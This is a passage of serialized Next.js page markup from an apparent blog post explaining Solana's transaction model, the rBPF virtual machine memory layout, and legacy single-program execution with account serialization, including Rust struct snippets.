border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"data\"}],\" field is the central component of our story.\"]}]\n"])</script><script>self.__next_f.push([1,"23:[\"$\",\"h3\",\"h3-1\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"Transaction and Instruction Flow\"}]\n"])</script><script>self.__next_f.push([1,"24:[\"$\",\"p\",\"p-15\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"To take full advantage of storing data as \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Account\"}],\", Solana \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Transaction\"}],\" specify upfront which accounts it intends to access, as well as how it intends to access the accounts (read only or read + write). This allows validators to check if different transactions has overlapping storage access, and decide on whether it is safe to schedule transactions for execution in parallel.\"]}]\n"])</script><script>self.__next_f.push([1,"25:[\"$\",\"p\",\"p-16\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Transaction\"}],\" can also include multiple \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Instruction\"}],\", each of which is a contract call. This provides a scripting capability for users to perform complex operations in a single transaction. The \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Instructions\"}],\" in a \",[\"$\",\"code\",\"code-3\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Transaction\"}],\" are executed sequentially and atomically.\"]}]\n"])</script><script>self.__next_f.push([1,"26:[\"$\",\"pre\",\"pre-1\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Transaction\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" signatures\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Signature\"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-23\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" message\"]}],[\"$\",\"span\",\"code-segment-25\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],\"$L111\",\"$L112\",\"$L113\",\"$L114\",\"$L115\",\"$L116\",\"$L117\",\"$L118\",\"$L119\",\"\\n\",\"$L11a\",\"$L11b\",\"$L11c\",\"$L11d\",\"$L11e\",\"$L11f\",\"$L120\",\"$L121\",\"$L122\",\"$L123\",\"$L124\",\"$L125\",\"$L126\",\"$L127\",\"$L128\",\"$L129\",\"$L12a\",\"$L12b\",\"$L12c\",\"$L12d\",\"$L12e\",\"$L12f\",\"$L130\",\"$L131\",\"$L132\",\"$L133\",\"$L134\",\"$L135\",\"$L136\",\"$L137\",\"$L138\",\"$L139\",\"$L13a\",\"$L13b\",\"$L13c\",\"$L13d\",\"$L13e\",\"$L13f\",\"$L140\",\"$L141\",\"$L142\",\"$L143\",\"$L144\",\"$L145\",\"$L146\",\"$L147\",\"$L148\",\"$L149\",\"$L14a\",\"$L14b\",\"$L14c\",\"$L14d\",\"$L14e\",\"$L14f\",\"$L150\",\"$L151\",\"$L152\",\"$L153\",\"\\n\",\"$L154\",\"$L155\",\"$L156\",\"$L157\",\"$L158\",\"$L159\",\"$L15a\",\"$L15b\",\"$L15c\",\"$L15d\",\"$L15e\",\"$L15f\",\"$L160\",\"$L161\",\"$L162\",\"$L163\",\"$L164\",\"$L165\",\"$L166\",\"$L167\",\"$L168\",\"$L169\",\"$L16a\",\"$L16b\",\"$L16c\",\"$L16d\",\"$L16e\",\"$L16f\",\"$L170\",\"$L171\",\"$L172\",\"$L173\",\"$L174\",\"$L175\",\"$L176\",\"$L177\",\"$L178\",\"$L179\",\"$L17a\",\"$L17b\",\"$L17c\",\"$L17d\",\"\\n\",\"$L17e\",\"$L17f\",\"$L180\",\"$L181\",\"$L182\",\"$L183\",\"$L184\",\"$L185\",\"$L186\",\"$L187\",\"$L188\",\"$L189\",\"$L18a\",\"$L18b\",\"$L18c\",\"$L18d\",\"$L18e\",\"$L18f\",\"$L190\",\"$L191\",\"$L192\",\"$L193\",\"$L194\",\"$L195\",\"$L196\",\"$L197\",\"$L198\",\"$L199\",\"$L19a\",\"$L19b\",\"$L19c\",\"$L19d\",\"$L19e\",\"$L19f\",\"$L1a0\",\"$L1a1\",\"$L1a2\",\"$L1a3\",\"$L1a4\",\"$L1a5\",\"$L1a6\",\"$L1a7\",\"$L1a8\",\"$L1a9\",\"$L1aa\",\"$L1ab\",\"$L1ac\",\"$L1ad\",\"$L1ae\",\"$L1af\",\"$L1b0\",\"$L1b1\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"27:[\"$\",\"h3\",\"h3-2\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"The rBPF Virtual Machine\"}]\n28:[\"$\",\"p\",\"p-17\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Solana programs are typically written in Rust and compiled to a variant of eBPF (extended Berkeley Packet Filter) bytecode. The validator executes this bytecode within a sandboxed virtual machine.\"}]\n29:[\"$\",\"p\",\"p-18\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"For each transaction, the validator allocates a dedicated, isolated memory space for the VM. The virtual address memory map used by Solana SBF programs is fixed and laid out as follows:\"}]\n"])</script><script>self.__next_f.push([1,"2a:[\"$\",\"pre\",\"pre-2\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x100000000\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"-\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CODE\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"     \"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Program\"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" executable bytecode\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x200000000\"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"-\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"STACK\"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Call\"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-23\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"stack\"]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-25\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"4KB frames\"]}],[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segment-28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],\"$L1b2\",\"$L1b3\",\"$L1b4\",\"$L1b5\",\"$L1b6\",\"$L1b7\",\"$L1b8\",\"$L1b9\",\"$L1ba\",\"$L1bb\",\"$L1bc\",\"$L1bd\",\"$L1be\",\"$L1bf\",\"$L1c0\",\"$L1c1\",\"$L1c2\",\"$L1c3\",\"$L1c4\",\"$L1c5\",\"$L1c6\",\"$L1c7\",\"$L1c8\",\"$L1c9\",\"$L1ca\",\"$L1cb\",\"$L1cc\",\"$L1cd\",\"$L1ce\",\"$L1cf\",\"$L1d0\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"2b:[\"$\",\"p\",\"p-19\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Within the VM, during execution, programs can modify their own memory however they want without affecting the memory stored on the host. All validation is checked after the program execution completes.\"}]\n2c:[\"$\",\"h2\",\"h2-3\",{\"className\":\"text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow\",\"children\":\"The Legacy Model: Single Program Execution (~v1.14.x)\"}]\n2d:[\"$\",\"p\",\"p-20\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Let's first understand how a simple program execution flows in the legacy model. This process involves four main phases: loading accounts from the database, executing bytecode in the rBPF VM, validating changes to guarantee integrity, and committing the results to storage.\"}]\n2e:[\"$\",\"p\",\"p-21\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"$\",\"span\",\"img-0\",{\"className\":\"block my-8\",\"children\":[\"$\",\"img\",null,{\"className\":\"mx-auto\",\"src\":\"/blog/2025_06_27/single_program_memory_layout.png\",\"alt\":\"Single Program Memory Layout\"}]}]}]\n2f:[\"$\",\"p\",\"p-22\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"As shown in the diagram above, the legacy model serializes all account data into a contiguous \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"INPUT\"}],\" region. Here's how this process works:\"]}]\n30:[\"$\",\"h3\",\"h3-3\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"Phase 1: Loading and Serializing Accounts\"}]\n31:[\"$\",\"p\",\"p-23\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"The host and VM operate in completely isolated environments, they c"])</script><script>self.__next_f.push([1,"an't share objects or pointers directly. All account data must cross this boundary through serialization and deserialization, creating a controlled interface between the trusted host and the sandboxed VM.\"}]\n"])</script><script>self.__next_f.push([1,"32:[\"$\",\"p\",\"p-24\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The validator loads all requested accounts from the database and serializes them into a binary blob that gets copied into the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"INPUT\"}],\" region at \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"0x400000000\"}],\". Once inside the VM, programs usually start by deserializing the raw serialized \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Accounts\"}],\" into \",[\"$\",\"code\",\"code-3\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountInfo\"}],\" structures in its bootstrap routine\",[\"$\",\"mjx-container\",\"mjx-container-0\",{\"className\":\"MathJax\",\"jax\":\"SVG\",\"children\":[\"$\",\"svg\",\"svg-0\",{\"style\":{\"verticalAlign\":\"0\"},\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"0.988ex\",\"height\":\"1.887ex\",\"role\":\"img\",\"focusable\":\"false\",\"viewBox\":\"0 -833.9 436.6 833.9\",\"xmlnsXlink\":\"http://www.w3.org/1999/xlink\",\"children\":[[\"$\",\"defs\",\"defs-0\",{\"children\":[\"$\",\"path\",\"path-0\",{\"id\":\"MJX-1-TEX-N-31\",\"d\":\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"}]}],[\"$\",\"g\",\"g-0\",{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"transform\":\"scale(1,-1)\",\"children\":[\"$\",\"g\",\"g-0\",{\"data-mml-node\":\"math\",\"children\":[\"$\",\"g\",\"g-0\",{\"data-mml-node\":\"msup\",\"children\":[[\"$\",\"g\",\"g-0\",{\"data-mml-node\":\"mi\"}],[\"$\",\"g\",\"g-1\",{\"data-mml-node\":\"mn\",\"transform\":\"translate(33,363) scale(0.707)\",\"children\":[\"$\",\"use\",\"use-0\",{\"data-c\":\"31\",\"xlinkHref\":\"#MJX-1-TEX-N-31\"}]}]]}]}]}]]}]}],\". The \",[\"$\",\"code\",\"code-4\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountInfo\"}],\" are stored in the VM's heap memory before handing control to the program entrypoint function:\"]}]\n"])</script><script>self.__next_f.push([1,"33:[\"$\",\"pre\",\"pre-3\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// How programs reconstruct AccountInfo from the serialized data\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountInfo\"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" key\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"token 